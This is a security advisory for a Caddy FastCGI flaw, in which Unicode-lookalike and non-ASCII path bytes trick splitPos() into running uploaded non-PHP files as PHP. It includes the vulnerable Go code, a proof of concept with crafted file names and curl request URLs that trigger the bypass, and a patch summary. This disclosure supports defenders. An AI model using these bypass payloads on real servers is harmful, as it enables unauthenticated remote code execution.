# [H] Caddy: Unsafe Unicode Handling in FastCGI splitPos Allows Execution of Non-PHP Files

## Summary
Severity: High
Advisory: GHSA-m675-2p33-xv9g
CVE: CVE-2026-45135
CWE: CWE-176, CWE-178, CWE-20
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-m675-2p33-xv9g
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=2.7.0 <2.11.3

## Details
### Summary

The FastCGI transport's `splitPos()` in [`modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go`](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go) misuses `golang.org/x/text/search` with `search.IgnoreCase` when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead Caddy's FastCGI splitting into treating a non-`.php` (or other configured `split_path` extension) file as a script. In any deployment where the attacker can place content into a file served via FastCGI (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.

This function was adapted from FrankenPHP's code (see [the source comment](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go#L429)) and inherits the same bugs. Both were originally reported against FrankenPHP by @KC1zs4 as [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm) (which absorbed the duplicate GHSA-v4h7-cj44-8fc8). Credit for finding the underlying flaws belongs to @KC1zs4.

### Details

```go
var splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)

func (t Transport) splitPos(path string) int {
	if len(t.SplitPath) == 0 {
		return 0
	}
	pathLen := len(path)
	for _, split := range t.SplitPath {
		splitLen := len(split)
		for i := range pathLen {
			if path[i] >= utf8.RuneSelf {
				if _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {
					return end
				}
				break
			}
			if i+splitLen > pathLen {
				continue
			}
			match := true
			for j := range splitLen {
				c := path[i+j]
				if c >= utf8.RuneSelf {
					if _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {
						return end
					}
					break // <-- flaw 1: 'match' is still true
				}
				if 'A' <= c && c <= 'Z' {
					c += 'a' - 'A'
				}
				if c != split[j] {
					match = false
					break
				}
			}
			if match {
				return i + splitLen
			}
		}
	}
	return -1
}
```

#### Flaw 1 — Control-flow: stale `match` after inner non-ASCII fallback

In the inner `for j` loop, when a byte satisfies `c >= utf8.RuneSelf` and `splitSearchNonASCII.IndexString(...)` returns `-1`, the loop `break`s without setting `match = false`. The outer code then evaluates `if match { return i + splitLen }` with `match` still `true`, returning a position as if the configured extension had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named `name.<U+00A1>.txt` gets routed as PHP.

#### Flaw 2 — Unicode equivalence: `search.IgnoreCase` folds non-ASCII lookalikes onto ASCII

`search.New(language.Und, search.IgnoreCase)` performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII `.`, `p`, `h`, `p`, so a path containing `﹒php`, `．php`, `.ｐhp`, `.ⓟⓗⓟ`, `.𝗽𝗵𝗽`, `.𝓅𝒽𝓅`, `.𝖕𝖍𝖕`, etc. is reported as `.php`.

Both flaws share the same root cause: invoking `search.IgnoreCase` to match an ASCII-only, validated-lower-case `SplitPath` entry against an arbitrary path. `Provision()` already guarantees every entry is ASCII and lower-cased, so any byte `>= utf8.RuneSelf` in the path can never be part of a legitimate match — but the fallback ignored that guarantee.

### PoC

Run against a Caddy build serving FastCGI to PHP-FPM (or any FastCGI app where script lookup is gated by `split_path`). Caddyfile:

```text
:8080 {
    root * /app/public
    php_fastcgi unix//run/php/php-fpm.sock
}
```

Place attacker-controlled files in `/app/public`:

- `/app/public/poc-match-unset.\xc2\xa1.` — `<?php echo "marker=flaw1\n";`
- `/app/public/poc-search-norm.𝗽𝗵𝗽` — `<?php echo "marker=flaw2\n";`

Trigger:

```bash
# baseline (correctly NOT routed to PHP)
curl -i --path-as-is "http://127.0.0.1:8080/poc-match-unset.txt/trigger"
curl -i --path-as-is "http://127.0.0.1:8080/poc-search-norm/trigger"

# flaw 1 — the .¡.txt file ends up as SCRIPT_FILENAME
curl -i --path-as-is "http://127.0.0.1:8080/poc-match-unset.%C2%A1.txt/trigger"

# flaw 2 — the .𝗽𝗵𝗽 file ends up as SCRIPT_FILENAME
curl -i --path-as-is "http://127.0.0.1:8080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger"
```

Both crafted requests respond with the marker payload from the non-`.php` file, confirming arbitrary code execution through the body of attacker-controlled files.

A standalone reproducer of `splitPos()` in isolation (no Caddy build needed) is included in [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm); the function in this module is the same logic, so the same payloads apply.

### Impact

Comparable to the previous FastCGI `split_path` issue ([GHSA-g966-83w7-6w38 / CVE-2026-24895](https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38)) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a `.`). Where that precondition holds — common in upload endpoints, user-content stores, package mirrors — the bypass yields RCE in the FastCGI upstream via a single crafted URL, without authentication, over the network.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — High (8.1).

### Patch

Drop the `golang.org/x/text/search` fallback entirely and treat any byte `>= utf8.RuneSelf` in the path as a non-match. `SplitPath` entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path. See `fix/fastcgi-splitpos-unicode-bypass` (commit `4ddad83c`) for the implementation and regression tests.

### Credit

Both flaws were originally found and reported by @KC1zs4 against FrankenPHP, where the offending `splitPos()` function was first introduced before being adapted into this module. The Caddy maintainers thank @KC1zs4 for the high-quality reports.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g
- https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm
- https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38
- https://nvd.nist.gov/vuln/detail/CVE-2026-45135
- https://github.com/caddyserver/caddy
